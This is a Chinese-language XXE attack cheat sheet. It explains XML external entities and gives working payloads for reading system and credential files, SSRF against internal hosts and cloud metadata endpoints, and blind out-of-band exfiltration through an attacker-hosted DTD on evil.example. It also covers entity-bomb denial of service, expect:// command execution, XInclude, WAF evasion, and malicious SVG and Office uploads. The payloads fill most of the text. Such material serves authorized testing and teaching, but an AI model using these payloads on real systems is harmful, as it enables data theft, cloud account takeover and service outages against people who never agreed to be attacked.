## XXE 本质与原理

### 定义

**XXE（XML External Entity，XML 外部实体注入）**：攻击者向解析 XML 的接口提交精心构造的 XML，其中通过 **DOCTYPE / 实体（Entity）** 引用了外部资源（本地文件、内网 URL、远程 DTD），而解析器在配置不当的情况下会**解析并加载这些外部实体**，导致任意文件读取、SSRF、拒绝服务、甚至命令执行。



攻击模型

```
攻击者提交恶意 XML：
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
          │
          ▼
服务端 XML 解析器（未禁用外部实体）
          │ 加载 file:///etc/passwd
          ▼
响应体 / 报错 / 带外通道 回传文件内容 → 攻击者
```



### 漏洞的形成链条

| 环节             | 说明                                                         |
| :--------------- | :----------------------------------------------------------- |
| ① 解析器接收 XML | 业务功能接收 XML：接口请求体、文件上传（XML/SVG/Office）、RSS/SOAP/SAML 等 |
| ② 允许 DTD       | 解析器没有禁止 DOCTYPE 声明                                  |
| ③ 允许外部实体   | 解析器没有禁用**通用外部实体**（读文件/SSRF）或**外部参数实体**（OOB 外带） |
| ④ 回显通道       | 响应体回显、报错信息、或 DNS/HTTP 带外（攻击者服务器）       |



### 生效的三个必要观察维度

1. **DOCTYPE 是否被禁止**：禁止了 → 换 XInclude；
2. **通用外部实体是否加载**：加载 → 读文件/SSRF 可用；
3. **外部参数实体是否加载**：加载 → 即便无回显也能 OOB 外带。

### 快速探测

```
// 提交动词化实体验证是否解析（consolidation probe）：
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY e "TELEAGENT-PROBE"> ]>
<r>&e;</r>
// 若响应里出现 TELEAGENT-PROBE → 内部实体解析开启，深入测试外部实体
```



```
探测：内部实体是否回显？
 ├─ 是 → 有回显 XXE
 │    ├─ file:// 读文件
 │    └─ try expect:// 命令执行
 └─ 否 → 盲 XXE
      ├─ 报错信息泄露？ → error-based XXE
      ├─ 能出网？ → OOB 外部 DTD 外带
      └─ 都不行 → 试 DoS 探存活 / XInclude
```



###  六大攻击类型速查

| 类型             | 核心动作                             | 前置条件                 | 危害                 |
| :--------------- | :----------------------------------- | :----------------------- | :------------------- |
| **读文件**       | `file://` 外部实体 + 响应回显        | 通用实体解析 + 有回显    | 源码/配置/密钥泄露   |
| **SSRF**         | 外部实体 URL 指向内网/元数据         | 通用实体解析             | 内网探测、云接管前奏 |
| **盲 XXE (OOB)** | 外部 DTD + 参数实体，数据拼 URL 外带 | 外部参数实体解析 + 出网  | 无回显时仍读文件     |
| **错误回显 XXE** | 实体引用不存在文件 → 报错泄露内容    | 通用实体解析 + 错误回显  | 一次性读文件         |
| **DoS**          | Billion Laughs / Quadratic Blowup    | 实体递归展开             | 内存/CPU 打满        |
| **RCE**          | `expect://` 等特殊协议               | 特定扩展/环境 + 实体解析 | 命令执行             |



## XML 与 DTD 语法基础

### XML 文档结构

```
<?xml version="1.0" encoding="UTF-8"?>   // 声明（可选）
<!DOCTYPE 根元素 []>     // DOCTYPE：定义 DTD（内部或外部）
<根元素>                              // 元素
  内容 + &实体引用;
</根元素>
```

### 实体（Entity）全家桶

| 实体类型             | 声明语法                                         | 引用语法                        | 可用范围                          |
| :------------------- | :----------------------------------------------- | :------------------------------ | :-------------------------------- |
| **通用实体**（内部） | `<!ENTITY name "value">`                         | `&name;`                        | 文档内容区                        |
| **通用实体**（外部） | `<!ENTITY name SYSTEM "file:///etc/passwd">`     | `&name;`                        | 文档内容区 ← XXE 读文件/SSRF 主角 |
| **参数实体**（内部） | `<!ENTITY % name "value">`                       | `%name;`                        | 仅 DTD 内部                       |
| **参数实体**（外部） | `<!ENTITY % name SYSTEM "http://evil/evil.dtd">` | `%name;`                        | 仅 DTD 内部 ← 盲 XXE/OOB 主角     |
| **预定义实体**       | 内置                                             | `&lt; &gt; &amp; &apos; &quot;` | 转义 XML 特殊字符                 |
| **字符/数字引用**    | 内置                                             | `&#x41; &#65;`                  | Unicode 字符                      |

### PUBLIC / SYSTEM 关键字

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">          // SYSTEM：直接给定 URL/路径
<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://evil/x.dtd">  // PUBLIC：带公共标识符，第二个参数仍是可加载的 URL
<!DOCTYPE root SYSTEM "http://evil/evil.dtd">      // 外部 DTD：整体从远程加载
```

内部 DTD vs 外部 DTD（关键区分）:

|          | 内部 DTD                              | 外部 DTD（OOB 必用）                                         |
| :------- | :------------------------------------ | :----------------------------------------------------------- |
| 位置     | 写在提交的 XML 内（DOCTYPE 方括号内） | 托管在攻击者服务器，XML 里只写 `SYSTEM "http://evil/evil.dtd"` |
| 回显要求 | 依赖响应体回显（有回显 XXE）          | **无需响应回显**，通过参数实体把数据带外传回                 |
| 典型场景 | 响应体可直接看到文件内容              | 盲 XXE / 无回显 / WAF 拦截内联实体                           |

核心心法：通用实体 & vs 参数实体 %

记住一条：**通用实体（&）只能被文档内容引用，参数实体（%）只能被 DTD 引用**。OOB 盲 XXE 之所以能"把文件内容拼进 URL 发出去"，靠的就是**参数实体在 DTD 里层层嵌套展开**——这一套只在 DTD 内生效。



## 攻击面与注入点

### 接口/功能点清单

| 类别                   | 具体点位                                                     |
| :--------------------- | :----------------------------------------------------------- |
| **高频 **XML 接口      | Content-Type 为 `application/xml` / `text/xml` 的 POST 接口  |
| **高频 **SOAP 服务     | `SOAPAction`、`?wsdl`、`?xsd` 端点                           |
| **高频 **文件上传      | 上传 XML 后服务端解析（配置导入、数据模板、报表）            |
| **高频 **Office 文档   | 带 .docx/.xlsx/.pptx 上传，服务端解密 OOXML 时解析（见 14 章） |
| **中频 **SVG 图片上传  | SVG 内含 <!DOCTYPE> + 实体；XML 化的图片                     |
| **中频 **RSS/ATOM 订阅 | 服务端抓取并解析 RSS Feed                                    |
| **中频 **SAML/SSO      | 解析 SAML Assertion（含签名的 XML 元数据）                   |
| **中频 **PDF 表单      | PDF 内嵌 XFA XML 表单（Adobe/服务端处理）                    |
| **低频 **WebService    | WSDL/XSD 文档解析、RPC 参数                                  |
| **低频 **JSON→XML 桥接 | 服务端把 JSON 转 XML 后解析（实体逻辑仍存在）                |



### 注入点探测基线（Burp 套用）

```
// 原始请求体：
POST /api/parse HTTP/1.1
Content-Type: application/xml

<user><name>test</name></user>

// 探测替换：加入 DOCTYPE + 内部实体验证回显
<?xml version="1.0"?>
<!DOCTYPE user [ <!ENTITY e "PROBE"> ]>
<user><name>&e;</name></user>
```

 参数位置与格式提示:

- JSON 里可能藏着 XML 字符串字段（`"payload":"<xml>..."`），注意 **JSON 转义的双层编码**。
- XML 请求体若被 base64 包裹（`{"data":"base64xml"}`），先解包再注入。
- 上传点常限制扩展名：.xml/.svg 直接交；.docx/.xlsx/.odt/.ods 是 ZIP 容器。





## 读取任意文件

 基础文件读取（内部 DTD + 有回显）

```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```



 CDATA 包裹（处理含 </\n 的二进制/特殊内容）

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file   SYSTEM "file:///var/www/html/secret.php">
<!ENTITY % end    "]]>">
<!ENTITY % dtd    SYSTEM "http://evil/combine.dtd">
%dtd;
]>
<foo>&combined;</foo>

// combine.dtd（文件在攻击者服务器）：
<!ENTITY combined "%start;%file;%end;">
// 防止文件内容中的 < & 等字符破坏 XML 结构
```

文件里有 `< &` 会直接破坏 XML，解析失败，拿不到内容。
这个 CDATA 封装 trick：文件所有内容被包进 CDATA 段，**所有特殊字符失去 XML 语法意义，原样输出**，适合读 php 源码、二进制文件。







常用读取目标:

Linux

```
file:///etc/passwd
file:///etc/shadow        # 需高权限
file:///etc/hosts
file:///proc/self/environ  # 环境变量/AK/DB 密码
file:///proc/self/cmdline
file:///proc/net/arp       # 内网邻居
file:///root/.ssh/id_rsa
file:///var/www/html/config.php
```

Windows

```
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
file:///C:/apache/conf/httpd.conf
```



 PHP 环境专用 wrapper（配合 php://filter 读源码）

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"> ]>
<foo>&xxe;</foo>
// 适合 .php 源码（直接 file:// 会被 PHP 执行而从响应消失），base64 后解码
```



 路径不存在时的迭代探测

- 报错信息常直接吐出系统路径 → 用做路径探测的"oracle"。
- Windows 盘符枚举（C:…Z:）、Linux 常见目录字典逐个试。
- 文件存在但无权限：报 "Permission denied"，可区分"存在但不可读"与"不存在"。





## SSRF 与内网/云元数据

 XXE 即 SSRF

外部实体 `SYSTEM "http://..."` 里的 URL 可以让服务端代为发起任意 HTTP 请求 —— XXE 天然是 SSRF 载体，且不受"URL 参数返回值过滤"影响，直接从 XML 解析器发起。

```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.10:8080/"> ]>
<foo>&xxe;</foo>
```



内网探测与端口扫描

- **存活探测**：响应体/报错区分端口开闭（连接拒绝 vs 超时 vs 返回数据）。
- **批量扫描**：向多个内网地址逐个发实体请求；有 OOB 时用带外减少回显依赖。
- **协议面**：视解析器支持 `http/https/ftp/gopher/dict/file/jar/netdoc`（Java 系对 `netdoc://` 场景存在）。



 云元数据窃取（与 SSRF 章节同义）

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<foo>&xxe;</foo>
// 阿里云换 100.100.100.200，腾讯 metadata.tencentyun.com，GCP metadata.google.internal
// 拿到角色名后再取完整凭据 → 云账号接管
```



 联动：SSRF 打后端再反序列化

Java 场景下 XXE 外带协议可达 `gopher://` 时，可直接对 Redis/FastCGI 投字节流（思路同 SSRF 章节的 gopher 打法）。多数解析器禁 gopher，但有望通过 302 跳转/协议解析差异尝试。



## 盲 XXE（OOB 外带）

通用外带框架（外部 DTD + 参数实体）

```
// 提交给目标的 XML（引用攻击者服务器上的 DTD）：
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.example/evil.dtd">
  %dtd; %all;
]>
<foo>&send;</foo>

// evil.dtd（攻击者服务器托管）：
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://evil.example/?data=%file;'>">
%all;
```

过程：参数实体 `%file` 读取目标文件 → `%all` 串联进实体 `send` 的 URL → `%all` 在 DTD 内展开 → 文档里 `&send;` 触发对 `http://evil/?data=<base64文件内容>` 的请求 → 攻击者日志拿到文件。



 为何用 php://filter base64

- 文件含换行/空格/特殊字符会破坏 URL 与实体展开 → base64 保证安全传输。
- 非 PHP 环境则直接 file://，靠 URL 编码或牺牲部分特殊字符。



带外通道对比

| 通道       | 平台/工具                                                    | 适用                                                      |
| :--------- | :----------------------------------------------------------- | :-------------------------------------------------------- |
| HTTP 带外  | VPS + nc/python http.server、interactsh、Burp Collaborator、ngrok | 能出网首选，还能带数据                                    |
| DNS 带外   | dnslog.cn、ceye.io、interactsh 自定义 NS                     | HTTP 出网受限时（DNS 常被放行）；适合**探测**而非大量传输 |
| 子域名切分 | 把数据拆进多级子域名做 DNS 查询                              | 纯 DNS 通道传少量数据                                     |



错误回显型 XXE（error-based，无需外带）

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///error/%file;'>">
  %eval; %error;
]>
<foo/>
// 思路：把要读的内容拼进一个"必然报错"的文件路径，
// 解析器报错时把路径（含文件内容）回显在错误信息里 → 泄漏
```

经典变体：Windows 下用 `file:///C:/nonexist/<文件>`，通过"文件名非法字符"错误把内容带进异常信息。



本地文件走私（lo lo blind tricks）

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/filename.dtd">
%local_dtd;
// 复用目标服务器上已有的 DTD 文件，把一个"已知可重定义的参数实体"重定义成文件读取，
// 无需自己托管 DTD，绕过"目标不能出网"的限制
```

解决限制:**参数实体嵌套，只允许在【外部 DTD 文件】里面执行，不能在内部 DTD 里写**。





## DoS：实体炸弹

 Billion Laughs（十亿笑声攻击）

```
<?xml version="1.0"?> <!DOCTYPE lolz [  <!ENTITY lol "lol">  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">  ... <!ENTITY lol9 "&lol8;×10"> ]> <lolz>&lol9;</lolz>
```

9 层递归、每层放大 10 倍 → 展开到 **10⁹ 个 "lol"**，瞬间耗尽内存。现代解析器常限制实体嵌套深度予以缓解，但老旧/未加固解析器仍可能崩溃。



Quadratic Blowup（二次方膨胀，更隐蔽）

```
<?xml version="1.0"?> <!DOCTYPE bomb [ <!ENTITY a "xxxxxxxxxx..."> ]>  <!-- 单个大实体，如 5 万字符 --> <bomb>&a;&a;&a;&a; ... （重复数千次）</bomb>
```

不依赖递归（绕实体深度限制），靠"多次引用同一个大实体"让输出体积 O(n²) 膨胀。可组合参数实体放大。



参数实体版炸弹

```
<!DOCTYPE bomb [
 <!ENTITY % a "bbbb...bbb">          <!-- 大量字符 -->
 <!ENTITY % a1 "%a;%a;%a;... ">       <!-- 参数实体递归放大 -->
 ...>
<bomb></bomb>

9.4 DoS 的挖洞价值与应用

DoS 通常仅作为辅助证据，SRC 单独报 DoS 价值有限，但结合"解析器确实处理实体"可作为更高危类型的佐证。
测试时务必节制规模：用小额度验证放大原理即可，避免把生产打挂（授权内也要控制影响面）。
缓解：限制实体展开次数（Billion Laughs 限制器）、总展开大小上限、嵌套深度上限。
```



## RCE 与高级利用

expect:// 命令执行（PHP）

```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<foo>&xxe;</foo>
依赖 PHP expect 扩展（且未禁用该 wrapper）——生产环境少见，靶场/CTF 高频。
```



phar:// 反序列化（PHP，历史）

```
<!ENTITY xxe SYSTEM "phar:///path/to/uploaded.phar">
PHP 7 时代，外部实体加载 phar 可触发 phar 元数据反序列化 → 结合 POP 链 RCE；PHP 8.0 起 phar:// 已从流 wrapper 中移除，仅存在于老版本。
```



Java 场景：XXE → 反序列化 / 类型混淆

某些 Java 库将 XML 反序列化为对象（XStream/JAXB/简单 XML 映射），外部实体读到的内容再进入反序列化流程，可能链式触发 gadget。

XSLT 扩展：若支持 XSLT，可注入 `<xsl:include/import href>` 读文件，或打到支持脚本的 Xalan 扩展函数。



数据库/后端二次利用

SSRF 读内网管理接口（Jenkins script console、Docker API 2375、Redis）→ 转 RCE。

读到的配置含数据库凭据 → 拖库、后台登录（常规升级路径）。

读 `/proc/self/environ` 拿到云 AK/SK → 云资源操作。



## XInclude 注入（DOCTYPE 被禁时的绕过）

场景:

当解析器**禁止 DTD/DOCTYPE**、或用户只能控制 XML 的**部分内容而无法写入 DOCTYPE**时，改用 **XInclude** 让解析器**内联包含外部资源**，绕过"必须有 DOCTYPE"的限制。

只要 XML 解析器开启了 XInclude 支持，解析到 `<xi:include>` 标签时，就会自动拉取 `href` 指向的资源，替换掉这个标签。

Payload;

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- `parse="text"`：把读到的内容**当成纯文本**塞进来，里面的`<>&`不会当成 XML 标签解析，适合读普通文本文件（/etc/passwd、配置文件）
- 默认是 `parse="xml"`：把目标文件当成 XML 去解析，如果目标文件不是合法 XML，解析直接报错，读不到内容，所以读文件一般都加 `parse="text"`



生效条件

1.解析器支持 XInclude:

Java 等常需显式开启 `setXIncludeAware(true)`；PHP SimpleXML 部分场景；某些库默认关

2.能控制目标元素:

可插入 `xi:include` 元素及命名空间声明

3.无 DTD 依赖:

恰恰是优势：整个标签不涉及 DOCTYPE



## 编码与 WAF 绕过

 常见检测特征与绕过对照

| WAF 特征                      | 绕过手法                                 | 说明                                              |
| :---------------------------- | :--------------------------------------- | :------------------------------------------------ |
| 匹配 `<!DOCTYPE` / `<!ENTITY` | 大小写、空格变形                         | `<!DoCtYpE`、多空格 `<!DOCTYPE `；标签内制表/换行 |
| 匹配 `file://`                | 大小写 `FILE://`、Unicode 编码、协议混淆 | 视解析器对协议的大小写/编码宽容度                 |
| 匹配 `SYSTEM`                 | 切分写法、实体嵌套                       | 把关键字藏进参数实体/分级展开                     |
| 整段 XML 被拦                 | 字符编码切换                             | UTF-16（带 BOM）、UTF-7 等影响解析器识别          |
| 内联实体被拦                  | 改走**外部 DTD**（OOB）                  | 头部只留一句 `SYSTEM "http://evil/x.dtd"`         |
| 深层次拦截（RASP/WAF）        | 参数实体递归展开                         | 实体套实体，让规则匹配不到原始关键字              |



编码切换（encoding 攻击）

```
<?xml version="1.0" encoding="UTF-16"?>  <!-- 带 BOM，整包转 UTF-16，绕过只认 UTF-8 的 WAF -->
<?xml version="1.0" encoding="UTF-7"?>   <!-- 历史技巧，若解析器支持 UTF-7 -->
```

注意：编码切换是把"双刃剑"，很多现代解析器严格按声明编码解析，UTF-16 需在 HTTP 头部/首字节 BOM 保持一致，否则解析失败。



传统 XML 注入绕过通用项

- **CDATA**：`<![CDATA[<script>...]]>` 包裹内容绕过标签匹配（本章主战场读文件也用 CDATA，见 6.2）。
- **Overlong/多字节**：几十年老技巧，现代解析器多已免疫，仍可试。
- **空格族**：标签名/关键字间插入 `\x09 \x0A \x0D 空格`。
- **实体拆分**：把 `SYSTEM` 拆成 `S<span>...</span>` 无意义（XML 不认 HTML 标签），正确做法是参数实体分层展开。



 手工 Fuzz 四步

1. 定位哪类 payload 被拦（读文件 / SSRF / OOB 分别测）；
2. 单点形变（大小写/空格/编码/外置 DTD）逐个过；
3. 组合生最小可用 payload 并确认节奏；
4. 固定成"能过 WAF 且能出数据"的最终串，写进报告复现步骤。





## 特殊文件格式（XXE 的"隐形入口"）

 SVG（可视图文）

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="&xxe;" />          <!-- 实体展开后把文件内容塞进 href -->
  <text>&xxe;</text>                     <!-- 或直接文本回显 -->
</svg>

SVG 本质是 XML 图片，很多"图片上传/头像/缩放"服务用 XML 内核（ImageMagick/Batik/librsvg）渲染，上传恶意 SVG = 触发 XXE。
```



Office OOXML（docx/xlsx/pptx）

- Office 2007+ 文档是 **ZIP 容器**，内含多个 XML 部件：`[Content_Types].xml`、`word/document.xml`、`xl/sharedStrings.xml` 等。
- 在任一 XML 部件注入 `<!DOCTYPE>` + 外部实体，重打包成 .docx/.xlsx 上传，一旦服务端解析（预览/内容抽取/转 PDF）即触发。典型 OFM 处理库：Apache POI、OpenXML、python-docx 老版本。
- 识别"解包→改 XML→重新打包"工具：`zip/unzip`、`unzip x.docx && edit && zip`。
